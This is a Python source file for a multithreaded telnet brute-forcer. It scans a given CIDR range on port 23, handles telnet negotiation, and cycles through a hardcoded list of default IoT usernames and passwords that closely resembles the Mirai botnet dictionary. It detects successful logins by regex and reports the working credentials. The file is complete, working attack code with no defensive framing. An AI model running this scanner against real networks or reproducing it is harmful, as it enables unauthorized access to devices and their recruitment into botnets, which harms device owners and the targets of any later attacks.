import argparse
import re
import select
import socket
import threading
import time
from enum import IntEnum, auto

from picker import Picker

creds: list[tuple[str, str]] = [
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("root", "admin"),
    ("admin", "admin"),
    ("root", "888888"),
    ("root", "xmhdipc"),
    ("root", "default"),
    ("root", "juantech"),
    ("root", "123456"),
    ("root", "54321"),
    ("support", "support"),
    ("root", ""),
    ("admin", "password"),
    ("root", "root"),
    ("root", "12345"),
    ("user", "user"),
    ("admin", ""),
    ("root", "pass"),
    ("admin", "admin1234"),
    ("root", "1111"),
    ("admin", "smcadmin"),
    ("admin", "1111"),
    ("root", "666666"),
    ("root", "password"),
    ("root", "1234"),
    ("root", "klv123"),
    ("Administrator", "meinsm"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("guest", "guest"),
    ("guest", "12345"),
    ("admin1", "password"),
    ("administrator", "1234"),
    ("666666", "666666"),
    ("888888", "888888"),
    ("ubnt", "ubnt"),
    ("root", "klv1234"),
    ("root", "Zte521"),
    ("root", "hi3518"),
    ("root", "jvbzd"),
    ("root", "anko"),
    ("root", "zlxx."),
    ("root", "7ujMko0vizxv"),
    ("root", "7ujMko0admin"),
    ("root", "system"),
    ("root", "ikwb"),
    ("root", "dreambox"),
    ("root", "user"),
    ("root", "realtek"),
    ("root", "00000000"),
    ("admin", "1111111"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "54321"),
    ("admin", "123456"),
    ("admin", "7ujMko0admin"),
    ("admin", "4321"),
    ("admin", "pass"),
    ("admin", "meinsm"),
    ("tech", "tech"),
    ("mother", "fucker"),
]


class TelnetPrompt(IntEnum):
    LOGIN = auto()
    PASSWORD = auto()
    UNKNOWN = auto()


class TelnetStatus(IntEnum):
    TELNET_NOT_CONNECTED = auto()
    TELNET_WAITING_USERNAME = auto()
    TELNET_WAITING_PASSWORD = auto()
    TELNET_LOGIN_REJECTED = auto()
    TELNET_LOGIN_ACCEPTED = auto()
    TELNET_LOGIN_PENDING = auto()
    TELNET_DISCONNECTED = auto()


print_lock = threading.Lock()


def safeprint(*args, **kwargs) -> None:
    with print_lock:
        print(*args, **kwargs)


_IAC = 0xFF
_SB, _SE = 0xFA, 0xF0
_WILL, _WONT, _DO, _DONT = 0xFB, 0xFC, 0xFD, 0xFE

_FAILURE = re.compile(
    r"(?i)(?:"
    r"login incorrect"
    r"|incorrect (?:password|username|login)"
    r"|invalid (?:password|username|login|credentials)"
    r"|authentication (?:failed|failure|error)"
    r"|(?:access|login) denied"
    r"|permission denied"
    r"|too many (?:failed )?(?:login )?attempts"
    r"|login failed"
    r")"
)

_SUCCESS = re.compile(
    r"(?i)(?:last login\b|welcome to\b|login successful|authenticated)"
)

_LOGIN_PROMPT = re.compile(r"(?:ogin|sername)\s*:\s*$", re.I)
_PASSWORD_PROMPT = re.compile(r"assword\s*:\s*$", re.I)
_SHELL_PROMPT = re.compile(r"[#$>]\s*$")


def parse_cred_pair(raw: str) -> tuple[str, str]:
    user, sep, passwd = raw.partition(":")
    if not sep:
        raise argparse.ArgumentTypeError("Credentials must be in u:p format")
    return (user, passwd)


def parse_status_filter(raw: str) -> TelnetStatus:
    name = raw.strip().upper()
    if not name.startswith("TELNET_"):
        name = f"TELNET_{name}"
    try:
        return TelnetStatus[name]
    except KeyError as exc:
        valid = ", ".join(s.name for s in TelnetStatus)
        raise argparse.ArgumentTypeError(
            f"Unknown status '{raw}'. Valid statuses: {valid}"
        ) from exc


def get_next_pair(index: int, cred_list: list[tuple[str, str]]) -> tuple[str, str] | None:
    if index < len(cred_list):
        return cred_list[index]
    return None


def connect(host: str, port: int = 23, timeout: float = 5.0) -> socket.socket | None:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        return s
    except socket.error:
        return None


def _strip_telnet(raw: bytes) -> tuple[bytes, bytes]:
    out, replies = bytearray(), bytearray()
    i, n = 0, len(raw)
    while i < n:
        if raw[i] != _IAC:
            out.append(raw[i])
            i += 1
            continue
        if i + 1 >= n:
            break
        cmd = raw[i + 1]
        if cmd == _IAC:
            out.append(_IAC)
            i += 2
        elif cmd == _SB:
            end = raw.find(bytes([_IAC, _SE]), i + 2)
            i = n if end < 0 else end + 2
        elif cmd in (_WILL, _WONT, _DO, _DONT) and i + 2 < n:
            opt = raw[i + 2]
            if cmd == _DO:
                replies += bytes([_IAC, _WONT, opt])
            elif cmd == _WILL:
                replies += bytes([_IAC, _DONT, opt])
            i += 3
        else:
            i += 2
    return bytes(out), bytes(replies)


def _absorb(sock: socket.socket, raw: bytes) -> str:
    clean, replies = _strip_telnet(raw)
    if replies:
        try:
            sock.sendall(replies)
        except OSError:
            pass
    return clean.decode("utf-8", errors="replace")


def _read_response(
    sock: socket.socket,
    idle: float = 0.35,
    max_wait: float = 3.0,
    max_bytes: int = 8192,
) -> tuple[bytes, bool]:
    chunks: list[bytes] = []
    total = 0
    deadline = time.monotonic() + max_wait
    while total < max_bytes:
        wait = min(idle, deadline - time.monotonic())
        if wait <= 0:
            break
        ready, _, _ = select.select([sock], [], [], wait)
        if not ready:
            break
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, BlockingIOError):
            continue
        except ConnectionResetError:
            return b"".join(chunks), True
        if not chunk:
            return b"".join(chunks), True
        chunks.append(chunk)
        total += len(chunk)
        if _FAILURE.search(_absorb(sock, b"".join(chunks))):
            break
    return b"".join(chunks), False


def detect_prompt(text: str) -> TelnetPrompt:
    lines = [line for line in text.splitlines() if line.strip()]
    last = lines[-1] if lines else ""
    if _PASSWORD_PROMPT.search(last):
        return TelnetPrompt.PASSWORD
    if _LOGIN_PROMPT.search(last):
        return TelnetPrompt.LOGIN
    return TelnetPrompt.UNKNOWN


def get_payload(prompt: TelnetPrompt, cred: tuple[str, str]) -> bytes:
    username, password = cred
    match prompt:
        case TelnetPrompt.LOGIN:
            return (username + "\r\n").encode("utf-8")
        case TelnetPrompt.PASSWORD:
            return (password + "\r\n").encode("utf-8")
        case _:
            raise ValueError(f"Unsupported prompt state: {prompt}")


def _send(sock: socket.socket, prompt: TelnetPrompt, cred: tuple[str, str]) -> None:
    sock.sendall(get_payload(prompt, cred))


def classify(transcript: str, eof: bool) -> TelnetStatus:
    if _FAILURE.search(transcript):
        return TelnetStatus.TELNET_LOGIN_REJECTED
    if _SUCCESS.search(transcript):
        return TelnetStatus.TELNET_LOGIN_ACCEPTED
    if detect_prompt(transcript) is TelnetPrompt.UNKNOWN and _SHELL_PROMPT.search(
        transcript.rstrip()
    ):
        return TelnetStatus.TELNET_LOGIN_ACCEPTED
    if eof:
        return TelnetStatus.TELNET_DISCONNECTED
    return TelnetStatus.TELNET_LOGIN_PENDING


def attempt_login(
    sock: socket.socket, cred: tuple[str, str]
) -> tuple[TelnetStatus, str]:
    transcript = ""

    try:
        raw, eof = _read_response(sock)
        transcript += _absorb(sock, raw)

        for _ in range(2):
            prompt = detect_prompt(transcript)
            if prompt is TelnetPrompt.UNKNOWN:
                break
            _send(sock, prompt, cred)
            raw, eof = _read_response(sock)
            transcript += _absorb(sock, raw)
            if eof or _FAILURE.search(transcript) or _SUCCESS.search(transcript):
                break
    except OSError:
        return TelnetStatus.TELNET_DISCONNECTED, transcript

    return classify(transcript, eof), transcript


def summarize_session(
    buf: str,
    host: str,
    port: int,
    status: TelnetStatus,
    cred: tuple[str, str] | None = None,
) -> str:
    cred_info = f" ({cred[0]}:{cred[1]})" if cred else ""
    summary = f"{host}:{port} -> {status.name}{cred_info}"
    if status in (
        TelnetStatus.TELNET_LOGIN_ACCEPTED,
        TelnetStatus.TELNET_LOGIN_REJECTED,
    ) and buf:
        summary += f"\n{buf.strip()}"
    return summary


def do(
    target_ip: str,
    cred_list: list[tuple[str, str]],
    status_filter: TelnetStatus | None = None,
) -> None:
    target_port = 23
    status = TelnetStatus.TELNET_NOT_CONNECTED

    idx = 0
    while (cred := get_next_pair(idx, cred_list)) is not None:
        idx += 1

        session = connect(target_ip, target_port)
        if not session:
            return

        try:
            status, buf = attempt_login(session, cred)
        finally:
            session.close()

        if status is not TelnetStatus.TELNET_NOT_CONNECTED and (
            status_filter is None or status is status_filter
        ):
            safeprint(summarize_session(buf, target_ip, target_port, status, cred))

        if status is TelnetStatus.TELNET_LOGIN_ACCEPTED:
            break


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("cidr", help="Target CIDR block (e.g. 203.0.113.0/29)")
    parser.add_argument("--semaphore", type=int, default=10)
    parser.add_argument("--creds", type=parse_cred_pair, default=None)
    parser.add_argument("--bucket-width", type=int, default=2)
    parser.add_argument("--cooldown", type=int, default=500)
    parser.add_argument(
        "--filter",
        type=parse_status_filter,
        default=None,
        help="Only print summaries matching this TelnetStatus name (case-insensitive)",
    )
    args = parser.parse_args()

    active_creds = [args.creds] if args.creds is not None else creds
    slots = threading.Semaphore(args.semaphore)

    picker = Picker(
        args.cidr,
        bucket_width=args.bucket_width,
        cooldown_period=args.cooldown,
        exclude_private_ranges=False
    )

    def worker(host: str) -> None:
        with slots:
            do(host, active_creds, args.filter)

    threads: list[threading.Thread] = []
    try:
        while True:
            picked = picker.pick()
            if not picked:
                break
            host = str(picked)
            t = threading.Thread(target=worker, args=(host,))
            t.start()
            threads.append(t)
            threads = [th for th in threads if th.is_alive()]
    finally:
        for t in threads:
            t.join()
        picker.stop()


if __name__ == "__main__":
    main()